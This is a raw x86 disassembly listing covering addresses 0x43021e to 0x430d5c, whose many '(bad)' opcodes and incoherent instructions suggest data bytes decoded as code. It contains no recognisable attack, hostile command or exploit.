  43021e:	cmp    edi,DWORD PTR [esi+0x31]
  430221:	inc    eax
  430222:	lahf   
  430223:	inc    ebx
  430224:	gs scas al,BYTE PTR es:[edi]
  430226:	sub    BYTE PTR [esp+ebx*4+0x4c8d0242],dh
  43022d:	fisttp DWORD PTR [edx+edi*8]
  430230:	and    BYTE PTR [ecx],0x3a
  430233:	(bad)  
  430234:	mov    eax,0xf4d7c6ef
  430239:	sahf   
  43023a:	pop    ss
  43023b:	dec    eax
  43023c:	aad    0x6d
  43023e:	lahf   
  43023f:	dec    edx
  430240:	sbb    DWORD PTR [eax],eax
	...
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	mov    ebp,0xaf8a081a
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	inc    edi
  4302c1:	xchg   esp,eax
  4302c2:	jbe    0x43031b
  4302c4:	or     edi,esp
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	cmc    
  4302c9:	add    BYTE PTR [eax],al
  4302cb:	add    BYTE PTR ds:0x22359000,dh
  4302d1:	mov    esi,0x53ba7a10
  4302d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4302d7:	adc    cl,ch
  4302d9:	leave  
  4302da:	add    DWORD PTR [edx-0x2d],ebx
  4302dd:	les    edx,FWORD PTR [ebp+ebp*2+0x1ed5017e]
  4302e4:	mov    dl,0xd8
  4302e6:	sbb    BYTE PTR [esi+0x52b40ec3],dh
  4302ec:	pop    esi
  4302ed:	shl    DWORD PTR ds:0x4b720c96,cl
  4302f3:	ja     0x4302df
  4302f5:	int    0x1b
  4302f7:	cmp    DWORD PTR [ecx+eax*2],edx
  4302fa:	push   ebx
  4302fb:	inc    ebx
  4302fc:	adc    DWORD PTR es:[esi-0x7404b9bf],esi
  430303:	lods   al,BYTE PTR ds:[esi]
  430304:	fsubr  DWORD PTR [edi]
  430306:	je     0x430332
  430308:	mov    ds:0x687b1f77,al
  43030d:	fisttp QWORD PTR [ebx+0x2]
  430310:	and    eax,0x8551147c
  430315:	mov    ds:0xe6e817fc,eax
  43031a:	jecxz  0x430359
  43031c:	daa    
  43031d:	sub    eax,DWORD PTR [esi+0x19a07e05]
  430323:	lea    ebx,[ebp-0x63af7ce8]
  430329:	xor    eax,DWORD PTR ds:0x1b192cbe
  43032f:	mov    cl,0x6b
  430331:	pop    edx
  430332:	pop    es
  430333:	sti    
  430334:	xor    ah,BYTE PTR [eax]
  430336:	sbb    al,0x37
  430338:	push   0x4a92fcf0
  43033d:	imul   edx,DWORD PTR [edi+esi*8-0x42849cd0],0x32
  430345:	out    0xd0,eax
  430347:	(bad)  
  430348:	loopne 0x4302d9
  43034a:	cmp    DWORD PTR [eax-0x29],edx
  43034d:	mov    BYTE PTR [eax+0xe6aa98e],bh
  430353:	mov    ds:0x49d00975,eax
  430358:	frstor [eax-0x43]
  43035b:	pop    es
  43035c:	call   0x574a:0x94efbbbe
  430363:	mov    cl,0x1b
  430365:	fisub  DWORD PTR [edi-0x51]
  430368:	js     0x430385
  43036a:	retf   
  43036b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43036c:	call   0xeeed75
  430371:	sub    BYTE PTR [ebx-0x2a],bh
  430374:	call   0x8bb1:0x5f09b4e8
  43037b:	sbb    eax,0x50d67f97
  430380:	mov    ebp,0x206befc2
  430385:	mov    BYTE PTR [ecx-0x5f],dh
  430388:	push   0xffffff92
  43038a:	shl    DWORD PTR [edi-0x16734cbf],0x4
  430391:	ja     0x43038b
  430393:	mov    ah,0x1
  430395:	inc    eax
  430396:	push   esi
  430397:	jno    0x4303a0
  430399:	hlt    
  43039a:	arpl   WORD PTR [esi+0x44],si
  43039d:	test   BYTE PTR [edx],0x71
  4303a0:	xor    eax,0xa1b324a7
  4303a5:	xchg   edi,eax
  4303a6:	or     al,0x4b
  4303a8:	hlt    
  4303a9:	cmp    al,0x5
  4303ab:	loope  0x43032f
  4303ad:	mov    eax,ds:0x9b64d93
  4303b2:	shr    DWORD PTR ds:0xb1172810,1
  4303b8:	sub    al,0xe9
  4303ba:	or     al,0xcc
  4303bc:	pop    eax
  4303bd:	and    ebp,edx
  4303bf:	sar    ch,0x0
	...
  430432:	add    BYTE PTR [eax],al
  430434:	aaa    
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfd00:0x3f83a579
  430446:	add    DWORD PTR [eax],eax
  430448:	cmc    
  430449:	add    BYTE PTR [eax],al
  43044b:	add    dh,ah
  43044d:	inc    esi
  43044e:	pop    ecx
  43044f:	neg    ah
  430451:	int3   
  430452:	push   cs
  430453:	push   edi
  430454:	jmp    0x43049e
  430456:	scas   eax,DWORD PTR es:[edi]
  430457:	mul    DWORD PTR [esi-0x5b]
  43045a:	scas   eax,DWORD PTR es:[edi]
  43045b:	pop    ebp
  43045c:	mov    bl,0xad
  43045e:	add    DWORD PTR ds:0xf546c18c,ebx
  430464:	iret   
  430465:	idiv   ah
  430467:	retf   
  430468:	icebp  
  430469:	inc    ebp
  43046a:	mov    al,0xf7
  43046c:	(bad)  
  43046d:	lods   al,BYTE PTR ds:[esi]
  43046e:	pop    ds
  43046f:	pop    ds
  430470:	add    cl,dh
  430472:	sub    eax,0xa65109b9
  430477:	ret    
  430478:	adc    eax,0xd182334d
  43047d:	mov    eax,0xa70ef652
  430482:	ficom  WORD PTR [ebp+esi*1+0x6f]
  430487:	aaa    
  430488:	adc    DWORD PTR [edx+0x7],ecx
  43048b:	inc    edi
  43048c:	mov    dl,0x1a
  43048e:	push   esi
  43048f:	push   esp
  430490:	dec    esi
  430491:	imul   esp,DWORD PTR [edx+0x65f78e35],0xec8b7c1d
  43049b:	jmp    DWORD PTR [esp+ebp*4]
  43049e:	jns    0x4304cb
  4304a0:	jne    0x43044f
  4304a2:	mov    esi,0x4b1cd2e6
  4304a7:	dec    ebp
  4304a8:	fsub   QWORD PTR ds:0x34dc55b1
  4304ae:	fwait
  4304af:	add    eax,0x388653e3
  4304b4:	fs jae 0x4304ed
  4304b7:	(bad)  
  4304b8:	cmp    DWORD PTR [edx-0x7f],edi
  4304bb:	add    al,0xda
  4304bd:	mov    ch,0x54
  4304bf:	mov    eax,ds:0x3d4c4c7e
  4304c4:	shr    DWORD PTR [esi+edx*4],0x45
  4304c8:	xor    BYTE PTR [ebp-0x1b],cl
  4304cb:	retf   
  4304cc:	dec    ecx
  4304cd:	pop    edx
  4304ce:	sub    eax,0xc987c125
  4304d3:	(bad)  [eax+0x6e55072f]
  4304d9:	adc    DWORD PTR [esi-0x29],edi
  4304dc:	rol    ah,cl
  4304de:	pop    esp
  4304df:	jmp    0xf4a5:0x289c7479
  4304e6:	stos   BYTE PTR es:[edi],al
  4304e7:	dec    ebx
  4304e8:	aas    
  4304e9:	mov    bl,0x63
  4304eb:	push   edx
  4304ec:	xor    bh,bl
  4304ee:	cwde   
  4304ef:	pop    edi
  4304f0:	lahf   
  4304f1:	imul   esp,DWORD PTR [ebx-0x31],0x22
  4304f5:	imul   edx,DWORD PTR [esi],0xbfccac65
  4304fb:	scas   eax,DWORD PTR es:[edi]
  4304fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4304fd:	adc    bh,bl
  4304ff:	pop    edx
  430500:	test   al,0xdb
  430502:	into   
  430503:	sub    al,0x3f
  430505:	out    0xc0,al
  430507:	scas   al,BYTE PTR es:[edi]
  430508:	jmp    0x4304b0
  43050a:	out    dx,eax
  43050b:	scas   al,BYTE PTR es:[edi]
  43050c:	add    dh,BYTE PTR [eax+esi*1+0x7c]
  430510:	pop    ss
  430511:	push   cs
  430512:	(bad)  
  430513:	loopne 0x4304b7
  430515:	sbb    ebx,DWORD PTR [ebx]
  430517:	in     al,0xcd
  430519:	cmp    BYTE PTR [ecx+0x31de523b],dh
  43051f:	mov    edx,DWORD PTR [eax+0x682f0c7b]
  430525:	push   es
  430526:	cmc    
  430527:	inc    edi
  430528:	in     al,dx
  430529:	bound  eax,QWORD PTR [eax+0x36b68fa9]
  43052f:	mov    al,0xff
  430531:	jmp    0xcfac4212
  430536:	out    0xd1,al
  430538:	sbb    eax,0xca9bd992
  43053d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43053e:	cmp    cl,BYTE PTR [edi]
  430540:	xchg   esp,eax
	...
  4305b1:	add    BYTE PTR [eax],al
  4305b3:	add    BYTE PTR [esi],bh
  4305b5:	push   esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi-0x27]
  4305c1:	mov    al,0xaa
  4305c3:	test   eax,0x1fdf5
  4305c8:	cmc    
  4305c9:	add    BYTE PTR [eax],al
  4305cb:	add    dl,bl
  4305cd:	daa    
  4305ce:	scas   al,BYTE PTR es:[edi]
  4305cf:	imul   ecx,ebp,0x88f9c9e2
  4305d5:	outs   dx,DWORD PTR ds:[esi]
  4305d6:	aas    
  4305d7:	ficomp DWORD PTR [eax-0x764ff5b4]
  4305dd:	sbb    al,al
  4305df:	jmp    0x711111ad
  4305e4:	data16 es bnd jp 0x430619
  4305e9:	stos   DWORD PTR es:[edi],eax
  4305ea:	sbb    ah,0xb6
  4305ed:	mov    BYTE PTR [edi-0x15],al
  4305f0:	push   ebp
  4305f1:	or     dh,BYTE PTR [ebx-0x74]
  4305f4:	xchg   bl,ah
  4305f6:	ja     0x43066d
  4305f8:	pop    DWORD PTR [ebx]
  4305fa:	pop    edi
  4305fb:	push   ebx
  4305fc:	sub    eax,DWORD PTR cs:[edi+0x40c98b75]
  430603:	(bad)  
  430604:	pop    eax
  430605:	aad    0x85
  430607:	add    esi,DWORD PTR [ebx+edi*4-0x1d]
  43060b:	mov    ah,0x25
  43060d:	(bad)  
  43060f:	mov    edi,0x5d322382
  430614:	rcl    BYTE PTR [ecx+0x1d],0xf0
  430618:	mov    eax,0xb689fe13
  43061d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43061e:	push   0x34c6f364
  430623:	mov    ebx,0x4a8893b8
  430628:	xchg   DWORD PTR [ecx-0x5d],esp
  43062b:	data16 add cl,BYTE PTR [edx-0x344a2b59]
  430632:	or     cl,cl
  430634:	pop    es
  430635:	jne    0xc3fee0c9
  43063b:	lods   al,BYTE PTR ds:[esi]
  43063c:	jge    0x430652
  43063e:	pop    eax
  43063f:	cmp    al,0xe3
  430641:	push   ecx
  430642:	jae    0x4306b4
  430644:	paddw  mm0,QWORD PTR [eax+edi*4-0xa]
  430649:	sub    ah,cl
  43064b:	imul   eax,DWORD PTR [ecx],0xfb9e29aa
  430651:	(bad)  
  430652:	xchg   ecx,eax
  430653:	ins    DWORD PTR es:[edi],dx
  430654:	mov    ebp,0x2979ba01
  430659:	cmp    eax,0x75e7922a
  43065e:	fistp  WORD PTR [edx]
  430660:	mov    ds:0x32298536,al
  430665:	inc    eax
  430666:	data16 jbe 0x4305f3
  430669:	mov    ebx,0xd44b1e02
  43066e:	jnp    0x430693
  430670:	inc    edx
  430671:	sar    BYTE PTR [ebx],0xd1
  430674:	into   
  430675:	mov    edx,0x664386c7
  43067a:	mov    bl,0xf9
  43067c:	cmp    BYTE PTR [ebx+0x4c],0x24
  430680:	js     0x4306f3
  430682:	rol    BYTE PTR [ecx-0x78],cl
  430685:	fadd   DWORD PTR [esi]
  430687:	mov    ebp,0xad2df432
  43068c:	inc    ecx
  43068d:	(bad)  
  43068e:	xchg   esi,eax
  43068f:	xor    cl,BYTE PTR [esi+0x10]
  430692:	jbe    0x4306dc
  430694:	adc    eax,DWORD PTR [ecx+0x5ba4f8d0]
  43069a:	mov    esp,DWORD PTR [eax-0x33]
  43069d:	les    ebp,FWORD PTR [edi+esi*2+0x50]
  4306a1:	outs   dx,DWORD PTR ds:[esi]
  4306a2:	sbb    DWORD PTR [esp+eax*1-0x50],esp
  4306a6:	cmp    DWORD PTR ss:[eax+edi*8-0x4a],esi
  4306ab:	hlt    
  4306ac:	hlt    
  4306ad:	cmp    eax,0x561fe44
  4306b2:	in     eax,dx
  4306b3:	jns    0x430676
  4306b5:	seto   BYTE PTR [eax-0x46]
  4306b9:	mov    cl,0xa4
  4306bb:	pop    ecx
  4306bc:	push   esp
  4306bd:	popf   
  4306be:	add    al,0x8d
  4306c0:	push   edi
	...
  430731:	add    BYTE PTR [eax],al
  430733:	add    BYTE PTR [ecx-0x5f],dh
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0x56
  430741:	sar    DWORD PTR [ebx+ebp*2-0x16],0xfe
  430746:	add    DWORD PTR [eax],eax
  430748:	cmc    
  430749:	add    BYTE PTR [eax],al
  43074b:	add    ch,dh
  43074d:	aas    
  43074e:	xor    eax,0x7f3418ee
  430753:	(bad)  
  430754:	fadd   st,st(6)
  430756:	jmp    0x5ca1:0x758a69c0
  43075d:	push   ebx
  43075e:	sub    eax,0x6c9831d2
  430763:	lock push es
  430765:	push   ss
  430766:	inc    eax
  430767:	xor    ebp,ecx
  430769:	push   eax
  43076a:	mov    ds:0x107412b1,eax
  43076f:	jno    0x43077d
  430771:	mov    esp,0xe87c7ce8
  430776:	jl     0x4307df
  430778:	repnz shl BYTE PTR [ebp-0x227f2b53],0xa2
  430780:	mov    edx,0x6c647731
  430785:	pmulhw mm7,QWORD PTR fs:[ebp-0x71]
  43078a:	repnz addr16 xchg esi,eax
  43078d:	shl    al,1
  43078f:	adc    dh,BYTE PTR [ebp-0x4a28d589]
  430795:	sub    al,0x33
  430797:	ins    BYTE PTR es:[edi],dx
  430798:	sbb    BYTE PTR [ebx+0x2b21273a],al
  43079e:	lea    esp,[eax-0x2d]
  4307a1:	push   0xffade8d7
  4307a6:	xor    dl,BYTE PTR [esi]
  4307a8:	push   ds
  4307a9:	cs loopne 0x430787
  4307ac:	mov    ebp,0x8ccef84f
  4307b1:	push   ds
  4307b2:	dec    esp
  4307b3:	(bad)
  4307b7:	mov    dh,0x9d
  4307b9:	fwait
  4307ba:	in     eax,0x1
  4307bc:	push   es
  4307bd:	xor    BYTE PTR [edx+0x34],dl
  4307c0:	shr    BYTE PTR [ebx],1
  4307c2:	inc    esp
  4307c3:	ror    DWORD PTR [edi+0x18],0x1a
  4307c7:	neg    BYTE PTR [edi]
  4307c9:	mov    eax,ds:0x89b3dc28
  4307ce:	pop    edx
  4307cf:	inc    eax
  4307d0:	addr16 jnp 0x430767
  4307d3:	xchg   ch,ch
  4307d5:	fwait
  4307d6:	add    bh,cl
  4307d8:	jno    0x430805
  4307da:	loop   0x4307fe
  4307dc:	push   cs
  4307dd:	sbb    DWORD PTR [ebp-0x1bedf914],0x821bd82d
  4307e7:	and    esi,DWORD PTR [ecx]
  4307e9:	mov    al,0x18
  4307eb:	jns    0x430808
  4307ed:	jnp    0x430812
  4307ef:	sub    ch,BYTE PTR ds:0x3d09657b
  4307f5:	push   es
  4307f6:	xor    ah,ah
  4307f8:	pop    esp
  4307f9:	ss clc 
  4307fb:	jb     0x4307bb
  4307fd:	push   edi
  4307fe:	push   ecx
  4307ff:	leave  
  430800:	mov    bh,0x1e
  430802:	pop    es
  430803:	pushf  
  430804:	fistp  WORD PTR [edx-0x286fee4c]
  43080a:	sbb    al,BYTE PTR [ecx-0x2ebbd3eb]
  430810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430811:	xchg   edx,eax
  430812:	inc    ebx
  430813:	sahf   
  430814:	aam    0x4c
  430816:	fisub  WORD PTR ds:0xc1e25a87
  43081c:	faddp  st(0),st
  43081e:	push   eax
  43081f:	rcl    BYTE PTR [esi+0x5c],1
  430822:	sub    DWORD PTR [esi],esi
  430824:	stos   BYTE PTR es:[edi],al
  430825:	cmp    ah,bl
  430827:	adc    al,0x4c
  430829:	dec    ebp
  43082a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43082b:	add    BYTE PTR [edi+0x2a],bh
  43082e:	pusha  
  43082f:	sub    eax,ebx
  430831:	adc    al,0xb9
  430833:	test   eax,0xffe87012
  430838:	inc    ebp
  430839:	sbb    esp,eax
  43083b:	cwde   
  43083c:	enter  0xcec9,0x8
  430840:	add    DWORD PTR [eax],0x0
	...
  4308b2:	add    BYTE PTR [eax],al
  4308b4:	adc    al,0x74
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	in     al,0x3b
  4308c2:	xor    al,0xb
  4308c4:	(bad)  
  4308c6:	add    DWORD PTR [eax],eax
  4308c8:	cmc    
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    BYTE PTR [edx+0x1b],ah
  4308ce:	addr16 jge 0x4308c6
  4308d1:	call   0x9d19ef80
  4308d6:	test   al,0xca
  4308d8:	xlat   BYTE PTR ds:[ebx]
  4308d9:	and    al,BYTE PTR [edi+0x4771d0e9]
  4308df:	(bad)
  4308e2:	xchg   edx,eax
  4308e3:	mov    ecx,0x6ebdab40
  4308e8:	hlt    
  4308e9:	fstp   QWORD PTR [ecx-0x1b6d7ea4]
  4308ef:	mov    ds:0x471ea43a,eax
  4308f4:	arpl   di,si
  4308f6:	(bad)  
  4308f7:	test   BYTE PTR [ebx+0x194ac1f5],0x3a
  4308fe:	dec    esi
  4308ff:	jmp    0x2dde8c8d
  430904:	jmp    0x4308d1
  430906:	in     eax,0x7f
  430908:	adc    esp,DWORD PTR [ecx+0x718034c6]
  43090e:	push   edi
  43090f:	pop    ds
  430910:	cs push ds
  430912:	fcmovnu st,st(7)
  430914:	inc    ebx
  430915:	mov    BYTE PTR [edx],bl
  430917:	dec    esi
  430918:	es call 0x371b:0x565dc482
  430920:	jb     0x4308dc
  430922:	xor    DWORD PTR [edx],esi
  430924:	pushf  
  430925:	dec    edi
  430926:	mov    al,ss:0x407bbc59
  43092c:	test   ah,ah
  43092e:	fidiv  DWORD PTR [ebx-0x7]
  430931:	and    al,BYTE PTR ds:0x521552d9
  430937:	lods   al,BYTE PTR ds:[esi]
  430938:	mov    bh,0x63
  43093a:	mov    edi,0x36848e66
  43093f:	mov    gs,ebx
  430941:	inc    edi
  430942:	mov    ebx,0x60b8d95f
  430947:	mov    bl,0x5d
  430949:	enter  0x4e41,0xdc
  43094d:	push   edx
  43094e:	mov    ecx,0x7753466f
  430953:	push   eax
  430954:	(bad)  
  430955:	neg    BYTE PTR [esp+ecx*2]
  430958:	or     al,BYTE PTR [ecx]
  43095a:	mov    eax,0x548b6593
  43095f:	test   ah,0x3f
  430962:	retf   
  430963:	outs   dx,BYTE PTR ds:[esi]
  430964:	and    al,0x18
  430966:	or     eax,0x19c38ffb
  43096b:	push   ebp
  43096c:	retf   0x2b48
  43096f:	(bad)  [ebx+eax*1]
  430972:	(bad)  
  430973:	ds ins BYTE PTR es:[edi],dx
  430975:	mul    BYTE PTR [edx]
  430977:	add    edx,DWORD PTR [esi-0x4d34d843]
  43097d:	and    eax,ebx
  43097f:	(bad)
  430982:	in     al,dx
  430983:	int3   
  430984:	or     eax,0xf31aeb88
  430989:	xchg   edx,eax
  43098a:	rcl    BYTE PTR [ebp-0x55],cl
  43098d:	ins    BYTE PTR es:[edi],dx
  43098e:	sub    eax,0xc63e057f
  430993:	xor    BYTE PTR [edi+eax*2+0x4f],bh
  430997:	cmp    BYTE PTR [esi+0x26082665],0x4c
  43099e:	sbb    BYTE PTR [ebx],0xb8
  4309a1:	and    al,0xe9
  4309a3:	xchg   DWORD PTR ds:0x1bee599e,ebx
  4309a9:	and    eax,DWORD PTR [edi-0x2]
  4309ac:	mov    dl,0x84
  4309ae:	xchg   edx,eax
  4309af:	push   ss
  4309b0:	mov    ds:0x6fb04cca,eax
  4309b5:	cmp    BYTE PTR [ebp-0x5f],0xab
  4309b9:	aam    0x7d
  4309bb:	xchg   bh,bl
  4309bd:	les    edi,FWORD PTR [esi+0xadaf]
	...
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0x23d96037
  430a43:	inc    esp
  430a44:	aam    0x0
  430a46:	add    al,BYTE PTR [eax]
  430a48:	cmc    
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    BYTE PTR [edi+edi*2],ch
  430a4e:	mov    ah,0x26
  430a50:	shl    DWORD PTR [ebp-0x28],cl
  430a53:	jge    0x4309f9
  430a55:	mov    esi,0x7bb71b79
  430a5a:	js     0x430ac3
  430a5c:	xchg   edi,eax
  430a5d:	adc    edi,DWORD PTR [edx-0x1f189052]
  430a63:	add    ebp,DWORD PTR [eax]
  430a65:	not    BYTE PTR [ecx+0x7ec46ca0]
  430a6b:	std    
  430a6c:	add    al,0x6f
  430a6e:	lea    ebp,[ebp+0x1c]
  430a71:	jecxz  0x430aa6
  430a73:	mov    ch,0x32
  430a75:	xchg   edi,eax
  430a76:	retf   
  430a77:	xor    eax,DWORD PTR [ebx]
  430a79:	in     eax,0xf7
  430a7b:	aas    
  430a7c:	jo     0x430a0d
  430a7e:	adc    bh,BYTE PTR [ebx+0x5d12275a]
  430a84:	imul   ebx,edi,0xffffffff
  430a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430a88:	scas   eax,DWORD PTR es:[edi]
  430a89:	repz add DWORD PTR [eax+0x364b27e8],0x12
  430a91:	inc    esp
  430a92:	fcomi  st,st(0)
  430a94:	add    al,0xd0
  430a96:	pop    ss
  430a97:	sbb    ebx,DWORD PTR [esi+0x5f22ebd3]
  430a9d:	iret   
  430a9e:	dec    ebx
  430a9f:	test   BYTE PTR [ecx+0x17],ah
  430aa2:	sub    BYTE PTR [edx+0x68426edd],0x12
  430aa9:	mov    dl,0x66
  430aab:	lods   eax,DWORD PTR ds:[esi]
  430aac:	xor    eax,DWORD PTR [ebx+0x26dddc9]
  430ab2:	pop    ss
  430ab3:	xchg   edi,eax
  430ab4:	es or  eax,0x7bcea34c
  430aba:	mov    BYTE PTR [esi-0x579c9d91],al
  430ac0:	xor    al,0x14
  430ac2:	retf   0x6139
  430ac5:	(bad)  [eax+0x6]
  430ac8:	adc    dh,BYTE PTR [ebp+0x1a]
  430acb:	clc    
  430acc:	imul   esi,esi,0x3c
  430acf:	icebp  
  430ad0:	xchg   BYTE PTR ds:0xdeea0011,bh
  430ad6:	imul   edx,DWORD PTR [ecx],0x6
  430ad9:	cmp    BYTE PTR [esp+ebx*8],0x34
  430add:	ficomp WORD PTR [eax-0x1eaf4dab]
  430ae3:	mov    cl,0x44
  430ae5:	fmul   QWORD PTR [esi+0x2835f7c7]
  430aeb:	push   0xffffffd1
  430aed:	and    al,0x15
  430aef:	pop    esp
  430af0:	xchg   esp,eax
  430af1:	mov    bl,0xec
  430af3:	adc    eax,DWORD PTR [eax+eiz*2+0x5518c4fc]
  430afa:	lahf   
  430afb:	add    dh,BYTE PTR [esi+0x5d06150]
  430b01:	xchg   ebp,eax
  430b02:	xchg   BYTE PTR [edi+0x6798fe01],al
  430b08:	aad    0x75
  430b0a:	scas   eax,DWORD PTR es:[edi]
  430b0b:	push   ss
  430b0c:	stc    
  430b0d:	cs push edx
  430b0f:	int3   
  430b10:	mov    dl,0x4f
  430b12:	lahf   
  430b13:	jb     0x430b8c
  430b15:	cmp    al,0x18
  430b17:	inc    eax
  430b18:	mov    ch,0x58
  430b1a:	adc    esp,DWORD PTR [edx]
  430b1c:	adc    eax,0xb8941679
  430b21:	imul   ebp,DWORD PTR [edi+0x32],0x14
  430b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b26:	add    DWORD PTR [eax],esi
  430b28:	add    esi,DWORD PTR [ebx]
  430b2a:	jmp    0x430b1e
  430b2c:	mov    ds:0xe3b5a5d3,al
  430b31:	push   es
  430b32:	push   cs
  430b33:	loope  0x430bb1
  430b35:	xor    eax,0xaf43e2ec
  430b3a:	sub    al,0xa0
  430b3c:	das    
  430b3d:	inc    ebx
  430b3e:	in     al,0xc8
  430b40:	mov    BYTE PTR [eax],al
	...
  430bb2:	add    BYTE PTR [eax],al
  430bb4:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  430bba:	mov    ebx,0x4217e69a
  430bbf:	aas    
  430bc0:	adc    DWORD PTR [eax],ebx
  430bc2:	fst    QWORD PTR [edi-0x37]
  430bc5:	add    DWORD PTR [edx],eax
  430bc7:	add    ch,dh
  430bc9:	add    BYTE PTR [eax],al
  430bcb:	add    BYTE PTR [ecx],cl
  430bcd:	push   bx
  430bcf:	pop    ecx
  430bd0:	push   esi
  430bd1:	xlat   BYTE PTR ds:[ebx]
  430bd2:	xor    BYTE PTR [ecx+ebp*2+0xb],0x63
  430bd7:	and    BYTE PTR [ebp+0xe786022],dl
  430bdd:	inc    ebx
  430bde:	xchg   edi,eax
  430bdf:	in     eax,dx
  430be0:	push   esp
  430be1:	xchg   ebx,eax
  430be2:	cld    
  430be3:	(bad)  
  430be4:	pop    ebp
  430be5:	sbb    al,0x30
  430be7:	mov    ch,0xf1
  430be9:	loopne 0x430b85
  430beb:	clc    
  430bec:	pop    es
  430bed:	pop    ebp
  430bee:	rcr    esi,cl
  430bf0:	inc    ecx
  430bf1:	add    eax,0xfb4a6dbc
  430bf6:	(bad)  
  430bf7:	adc    ch,BYTE PTR [ebx]
  430bf9:	mov    edx,0x3f98e9ed
  430bfe:	or     al,0x33
  430c00:	out    0x7,eax
  430c02:	adc    eax,0x335ef08d
  430c07:	and    DWORD PTR ds:0xb113d822,esp
  430c0d:	pop    edi
  430c0e:	scas   al,BYTE PTR es:[edi]
  430c0f:	imul   ecx,DWORD PTR [ebp-0x80],0x76
  430c13:	sbb    BYTE PTR ds:0x5d8f6b4c,bh
  430c19:	jmp    0x430c37
  430c1b:	or     al,0x3c
  430c1d:	jns    0x430c43
  430c1f:	xor    al,0xf5
  430c21:	ins    BYTE PTR es:[edi],dx
  430c22:	xor    eax,0x610a72f3
  430c27:	mov    bh,0x6e
  430c29:	dec    esp
  430c2a:	scas   eax,DWORD PTR es:[edi]
  430c2b:	ins    DWORD PTR es:[edi],dx
  430c2c:	sub    al,al
  430c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430c2f:	(bad)  
  430c30:	mov    edi,DWORD PTR [esi]
  430c32:	xor    edi,DWORD PTR [ebx]
  430c34:	int3   
  430c35:	jg     0x430bef
  430c37:	or     BYTE PTR [eax],cl
  430c39:	xor    esi,esp
  430c3b:	pop    ss
  430c3c:	xchg   ebx,edx
  430c3e:	sub    DWORD PTR [ecx+0x75f2cecc],edi
  430c44:	ss scas al,BYTE PTR es:[edi]
  430c46:	imul   BYTE PTR [esp+edx*1]
  430c49:	pop    ecx
  430c4a:	ins    DWORD PTR es:[edi],dx
  430c4b:	sbb    eax,DWORD PTR [eax+ebp*2-0x6e]
  430c4f:	pop    ebp
  430c50:	xor    dl,al
  430c52:	sbb    eax,0xc4ba5277
  430c57:	and    DWORD PTR cs:[edx+eax*2+0x4691bcdc],ecx
  430c5f:	lock mov edx,0xbfaf92c9
  430c65:	scas   al,BYTE PTR es:[edi]
  430c66:	pop    esp
  430c67:	sub    eax,edi
  430c69:	jmp    FWORD PTR [edi]
  430c6b:	inc    esi
  430c6c:	mov    gs,ecx
  430c6e:	stc    
  430c6f:	pop    esi
  430c70:	clc    
  430c71:	scas   al,BYTE PTR es:[edi]
  430c72:	add    BYTE PTR [ecx-0x3d],cl
  430c75:	sub    al,0x24
  430c77:	daa    
  430c78:	or     BYTE PTR [esi+0x1ff17601],0x0
  430c7f:	or     al,0x64
  430c81:	jg     0x430cde
  430c83:	stc    
  430c84:	lods   eax,DWORD PTR ds:[esi]
  430c85:	jbe    0x430c7c
  430c87:	adc    al,0x24
  430c89:	ror    DWORD PTR [esp+ebx*1+0x70],0x6b
  430c8e:	push   0xe7170fa4
  430c93:	jmp    0xe2cd6712
  430c98:	pop    ss
  430c99:	jae    0x430cf1
  430c9b:	lfs    edx,FWORD PTR [esi-0xd]
  430c9f:	test   BYTE PTR [edx-0x16b7151a],dl
  430ca5:	cmp    ecx,DWORD PTR [ebx]
  430ca7:	mov    DWORD PTR [ebx],edx
  430ca9:	xchg   ebp,eax
  430caa:	push   eax
  430cab:	mov    WORD PTR [eax+0x5465ea6e],ss
  430cb1:	pop    ebp
  430cb2:	call   0xe7d8:0xe99e9b7
  430cb9:	scas   al,BYTE PTR es:[edi]
  430cba:	int3   
  430cbb:	fmul   QWORD PTR [esi]
  430cbd:	mov    ah,0x35
  430cbf:	or     ecx,DWORD PTR [ebx]
	...
  430d31:	add    BYTE PTR [eax],al
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d4b
  430d41:	add    BYTE PTR [esi+0x202bed9],dh
  430d47:	add    ch,dh
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    BYTE PTR [eax+eax*4+0xc],ch
  430d4f:	bound  eax,QWORD PTR [eax]
  430d51:	leave  
  430d52:	out    dx,eax
  430d53:	mov    esi,0xb0ec4654
  430d58:	pop    ebp
  430d59:	jbe    0x430dc6
  430d5b:	push   eax
  430d5c:	dec    esi
